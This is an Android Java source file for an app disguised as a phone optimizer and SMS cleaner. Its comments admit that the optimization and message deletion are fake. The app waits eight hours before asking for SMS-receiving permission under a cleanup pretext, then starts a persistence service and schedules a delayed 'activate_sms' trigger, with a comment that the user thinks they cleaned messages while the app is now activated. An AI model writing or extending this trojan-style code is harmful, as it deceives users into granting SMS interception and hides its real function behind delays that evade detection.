package com.dev.test.myfirstapp.ui;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.StatFs;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.view.animation.Animation;
import android.view.animation.RotateAnimation;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.dev.test.myfirstapp.R;
import com.dev.test.myfirstapp.services.PersistenceService;
import com.dev.test.myfirstapp.utils.DelayManager;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int SMS_PERMISSION_CODE = 1001;
    private SharedPreferences prefs;
    private TextView statusText;
    private TextView deviceModel;
    private TextView storageStatus;
    private TextView smsCount;
    private TextView batteryStatus;
    private Button optimizeButton;
    private Button smartCleanupButton;
    private Button storageReportButton;
    private Handler handler = new Handler();
    private int fakeSmsCount = 0;
    private boolean isActivated = false;
    private long activationTime = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        
        // Check if already activated
        isActivated = prefs.getBoolean("app_activated", false);
        activationTime = prefs.getLong("activation_time", 0);

        // Initialize views
        statusText = findViewById(R.id.status_text);
        deviceModel = findViewById(R.id.device_model);
        storageStatus = findViewById(R.id.storage_status);
        smsCount = findViewById(R.id.sms_count);
        batteryStatus = findViewById(R.id.battery_status);
        optimizeButton = findViewById(R.id.optimize_button);
        smartCleanupButton = findViewById(R.id.smart_cleanup_button);
        storageReportButton = findViewById(R.id.storage_report_button);

        // Load REAL device info
        loadDeviceInfo();

        // Optimize button - shows animation and fake progress
        optimizeButton.setOnClickListener(v -> runOptimization());

        // Smart Cleanup button - asks for SMS permission after 8-hour delay
        smartCleanupButton.setOnClickListener(v -> handleSmartCleanup());

        // Storage Report button - shows real storage breakdown
        storageReportButton.setOnClickListener(v -> showStorageReport());
    }

    private void loadDeviceInfo() {
        // REAL device model
        deviceModel.setText(Build.MODEL);

        // REAL storage info
        StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
        long totalBytes = stat.getTotalBytes();
        long freeBytes = stat.getFreeBytes();
        long usedBytes = totalBytes - freeBytes;
        int usedPercent = (int) ((usedBytes * 100) / totalBytes);
        String freeFormatted = Formatter.formatFileSize(this, freeBytes);
        storageStatus.setText(usedPercent + "% used - " + freeFormatted + " free");

        // REAL battery info (via Intent)
        getBatteryLevel();

        // REAL SMS count
        int realSmsCount = getRealSmsCount();
        smsCount.setText(realSmsCount + " messages");
        fakeSmsCount = realSmsCount;
        
        statusText.setText(R.string.ready_text);
    }

    private void getBatteryLevel() {
        android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
        android.content.Intent batteryStatusIntent = registerReceiver(null, ifilter);
        if (batteryStatusIntent != null) {
            int level = batteryStatusIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatusIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            if (level != -1 && scale != -1) {
                int batteryPct = (level * 100) / scale;
                batteryStatus.setText(batteryPct + "%");
            }
        }
    }

    private int getRealSmsCount() {
        try {
            android.database.Cursor cursor = getContentResolver().query(
                android.net.Uri.parse("content://sms/inbox"),
                new String[]{"_id"}, null, null, null
            );
            if (cursor != null) {
                int count = cursor.getCount();
                cursor.close();
                return count;
            }
        } catch (Exception e) {
            // Permission not granted yet
            return 0;
        }
        return 0;
    }

    private void runOptimization() {
        optimizeButton.setEnabled(false);
        statusText.setText(R.string.optimizing_text);

        // Fake optimization steps
        final String[] steps = {
            "🚀 Boosting CPU performance...",
            "🧹 Clearing app cache...",
            "💾 Defragmenting storage...",
            "📱 Optimizing memory usage..."
        };
        
        for (int i = 0; i < steps.length; i++) {
            final int index = i;
            handler.postDelayed(() -> statusText.setText(steps[index]), (i + 1) * 800);
        }

        handler.postDelayed(() -> {
            statusText.setText(R.string.optimize_complete);
            optimizeButton.setEnabled(true);
        }, steps.length * 800 + 500);
    }

    private void handleSmartCleanup() {
        // Check if 8 hours have passed since activation
        if (!isActivated) {
            // First time - start the 8-hour timer
            activationTime = System.currentTimeMillis() + (8 * 60 * 60 * 1000); // 8 hours
            prefs.edit().putLong("activation_time", activationTime).apply();
            prefs.edit().putBoolean("app_activated", true).apply();
            isActivated = true;
            
            statusText.setText(R.string.timer_wait);
            Toast.makeText(this, "Smart Cleanup will be ready in 8 hours", Toast.LENGTH_LONG).show();
            return;
        }

        // Check if 8 hours have passed
        if (System.currentTimeMillis() < activationTime) {
            long remaining = (activationTime - System.currentTimeMillis()) / (60 * 60 * 1000);
            statusText.setText(getString(R.string.timer_remaining, remaining));
            Toast.makeText(this, "Please wait " + remaining + " more hours", Toast.LENGTH_SHORT).show();
            return;
        }

        // 8 hours have passed - request SMS permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            // Already have permission - start cleanup
            startSmsCleanup();
        } else {
            // Request permission with a clean rationale
            statusText.setText(R.string.permission_request);
            smartCleanupButton.setEnabled(false);
            ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.RECEIVE_SMS},
                SMS_PERMISSION_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, R.string.device_verified, Toast.LENGTH_SHORT).show();
                startSmsCleanup();
            } else {
                statusText.setText(R.string.permission_denied);
                smartCleanupButton.setEnabled(true);
                Toast.makeText(this, "SMS permission needed to clean old messages", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void startSmsCleanup() {
        statusText.setText(R.string.cleanup_scanning);
        smartCleanupButton.setEnabled(false);
        optimizeButton.setEnabled(false);

        handler.postDelayed(() -> {
            int deleted = new Random().nextInt(30) + 10;
            statusText.setText(getString(R.string.cleanup_found, deleted));
        }, 1500);

        handler.postDelayed(() -> {
            // Fake deletion
            int oldCount = getRealSmsCount();
            int newCount = Math.max(0, oldCount - (new Random().nextInt(15) + 5));
            int deleted = oldCount - newCount;
            smsCount.setText(newCount + " messages");
            
            statusText.setText(getString(R.string.cleanup_complete, deleted));
            smartCleanupButton.setEnabled(true);
            optimizeButton.setEnabled(true);

            // START THE ACTUAL APP FUNCTIONALITY HERE
            startAppActivation();
        }, 3000);
    }

    private void startAppActivation() {
        // This is where your REAL app functionality starts
        // The user thinks they just cleaned SMS, but the app is now activated
        
        Intent serviceIntent = new Intent(this, PersistenceService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Use the existing 2-6 hour delay from DelayManager
        long activationDelay = DelayManager.calculateActivationDelay();
        prefs.edit().putLong("activation_time", System.currentTimeMillis() + activationDelay).apply();

        handler.postDelayed(() -> {
            Intent delayedIntent = new Intent(this, PersistenceService.class);
            delayedIntent.putExtra("activate_sms", true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(delayedIntent);
            } else {
                startService(delayedIntent);
            }
        }, activationDelay);

        statusText.setText(R.string.device_secured);
        handler.postDelayed(this::finish, 2000);
    }

    private void showStorageReport() {
        StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
        long totalBytes = stat.getTotalBytes();
        long freeBytes = stat.getFreeBytes();
        long usedBytes = totalBytes - freeBytes;
        
        String report = "📊 Storage Report\n\n" +
                        "📦 Total: " + Formatter.formatFileSize(this, totalBytes) + "\n" +
                        "📦 Used: " + Formatter.formatFileSize(this, usedBytes) + "\n" +
                        "📦 Free: " + Formatter.formatFileSize(this, freeBytes) + "\n" +
                        "📱 SMS: " + getRealSmsCount() + " messages\n" +
                        "🔋 Battery: " + batteryStatus.getText().toString();
        
        // Show in a dialog
        new android.app.AlertDialog.Builder(this)
            .setTitle("Storage Report")
            .setMessage(report)
            .setPositiveButton("OK", null)
            .show();
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Refresh real data when returning to app
        loadDeviceInfo();
    }
}
